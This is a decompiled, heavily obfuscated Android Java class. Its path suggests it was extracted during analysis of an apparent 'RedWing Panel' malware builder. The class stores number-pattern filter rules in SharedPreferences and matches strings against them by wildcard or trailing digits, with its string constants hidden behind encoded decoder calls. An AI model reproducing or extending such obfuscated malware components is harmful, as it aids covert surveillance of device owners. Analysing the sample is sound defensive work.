package v.s;

import android.content.Context;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;
import java.util.ArrayList;
import java.util.regex.Pattern;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public abstract class Q3cjYjZRPm74Z {
    public static volatile boolean JXn4Qf7zpnLjP5;
    public static final String dDIMxZXP1V8HdM;
    public static final ArrayList vekpFI4d1Nc4fakF;
    public static final String w9sT1Swbhx3hs;

    static {
        TypefaceCache.obtain("000B00730057009700F500AD00FF008E000900790059");
        dDIMxZXP1V8HdM = TypefaceCache.obtain("0021007A0054008400FB008000C000B2002F00730048");
        w9sT1Swbhx3hs = TypefaceCache.obtain("003100630057008200E3");
        vekpFI4d1Nc4fakF = new ArrayList();
    }

    public static void Ee8d2j4S9Vm5yGuR(Context context, String str) {
        O0DzWbzyYI2BykPDCod.fivkjwgu2UdAtiY(vekpFI4d1Nc4fakF, new L51Pjdycxi4mx(str, 1));
        xDyLpEZyrcKVe0(context);
    }

    public static void JXn4Qf7zpnLjP5(DataQFAdapter dataQFAdapter) {
        String str = "[]";
        ArrayList arrayList = vekpFI4d1Nc4fakF;
        try {
            String string = dataQFAdapter.getSharedPreferences(dDIMxZXP1V8HdM, 0).getString(w9sT1Swbhx3hs, "[]");
            if (string != null) {
                str = string;
            }
            JSONArray jSONArray = new JSONArray(str);
            arrayList.clear();
            int length = jSONArray.length();
            for (int i = 0; i < length; i++) {
                JSONObject jSONObject = jSONArray.getJSONObject(i);
                arrayList.add(new w1TnexfebvFZ(jSONObject.getString(TypefaceCache.obtain("002D00630056008500F500AD")), jSONObject.optString(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("0022007A0057"))));
            }
            TypefaceCache.obtain("000F0079005A008300F500BB0092");
            arrayList.size();
            TypefaceCache.obtain("006300740057008800F300B4009200B50036007A005E0094");
        } catch (Exception e) {
            TypefaceCache.obtain("002A00780052009300B000BA00C000B5002C0064000100C7");
            e.getMessage();
        }
    }

    /* JADX WARN: Code duplicated, block: B:17:0x004c  */
    /* JADX WARN: Code duplicated, block: B:20:0x0058  */
    /* JADX WARN: Code duplicated, block: B:31:0x00b4  */
    public static boolean b1EoSIRjJHO5(String str) {
        boolean zMatches;
        boolean z;
        ArrayList arrayList = vekpFI4d1Nc4fakF;
        if (!arrayList.isEmpty() && (arrayList == null || !arrayList.isEmpty())) {
            int size = arrayList.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayList.get(i);
                i++;
                w1TnexfebvFZ w1tnexfebvfz = (w1TnexfebvFZ) obj;
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(w1tnexfebvfz.w9sT1Swbhx3hs, TypefaceCache.obtain("0022007A0057")) || okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(w1tnexfebvfz.w9sT1Swbhx3hs, TypefaceCache.obtain("0030007B0048"))) {
                    String str2 = w1tnexfebvfz.dDIMxZXP1V8HdM;
                    if (str2.length() == 0) {
                        zMatches = false;
                    } else if (str2.equals("*")) {
                        zMatches = true;
                    } else {
                        String strReplaceAll = Pattern.compile(TypefaceCache.obtain("00180048000B00CA00A900F400EF")).matcher(str).replaceAll("");
                        String strReplaceAll2 = Pattern.compile(TypefaceCache.obtain("00180048000B00CA00A900F40098009A")).matcher(str2).replaceAll("");
                        if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(strReplaceAll2, "*", false)) {
                            zMatches = Pattern.compile(BS2kx9eAoOyDiNGAFlFk.MSGkxvPxRYNqC(strReplaceAll2, "*", ".*")).matcher(strReplaceAll).matches();
                        } else if (strReplaceAll.endsWith(KgSM0TsKUpCiuePB.OYRwk007Mtyi(strReplaceAll2, 10)) || strReplaceAll.equals(strReplaceAll2)) {
                            zMatches = true;
                        } else {
                            zMatches = false;
                        }
                    }
                    if (zMatches) {
                        z = true;
                    } else {
                        z = false;
                    }
                } else {
                    z = false;
                }
                if (z) {
                    return true;
                }
            }
        }
        return false;
    }

    public static void dDIMxZXP1V8HdM(Context context, String str, String str2) {
        L51Pjdycxi4mx l51Pjdycxi4mx = new L51Pjdycxi4mx(str, 0);
        ArrayList arrayList = vekpFI4d1Nc4fakF;
        O0DzWbzyYI2BykPDCod.fivkjwgu2UdAtiY(arrayList, l51Pjdycxi4mx);
        arrayList.add(new w1TnexfebvFZ(str, str2));
        xDyLpEZyrcKVe0(context);
        TypefaceCache.obtain("00020072005F008200F400FF00D000AB002C0075005000C700E200AA00DE00A200790036");
    }

    public static void ibVTtJUNfrGYbW(boolean z) {
        JXn4Qf7zpnLjP5 = z;
    }

    public static JSONArray vekpFI4d1Nc4fakF() {
        JSONArray jSONArray = new JSONArray();
        ArrayList arrayList = vekpFI4d1Nc4fakF;
        int size = arrayList.size();
        int i = 0;
        while (i < size) {
            Object obj = arrayList.get(i);
            i++;
            w1TnexfebvFZ w1tnexfebvfz = (w1TnexfebvFZ) obj;
            jSONArray.put(new JSONObject().put(TypefaceCache.obtain("002D00630056008500F500AD"), w1tnexfebvfz.dDIMxZXP1V8HdM).put(TypefaceCache.obtain("0037006F004B0082"), w1tnexfebvfz.w9sT1Swbhx3hs));
        }
        return jSONArray;
    }

    public static void w9sT1Swbhx3hs(Context context) {
        vekpFI4d1Nc4fakF.clear();
        xDyLpEZyrcKVe0(context);
    }

    public static void xDyLpEZyrcKVe0(Context context) {
        try {
            JSONArray jSONArray = new JSONArray();
            ArrayList arrayList = vekpFI4d1Nc4fakF;
            int size = arrayList.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayList.get(i);
                i++;
                w1TnexfebvFZ w1tnexfebvfz = (w1TnexfebvFZ) obj;
                jSONArray.put(new JSONObject().put(TypefaceCache.obtain("002D00630056008500F500AD"), w1tnexfebvfz.dDIMxZXP1V8HdM).put(TypefaceCache.obtain("0037006F004B0082"), w1tnexfebvfz.w9sT1Swbhx3hs));
            }
            context.getSharedPreferences(dDIMxZXP1V8HdM, 0).edit().putString(w9sT1Swbhx3hs, jSONArray.toString()).apply();
        } catch (Exception unused) {
        }
    }
}
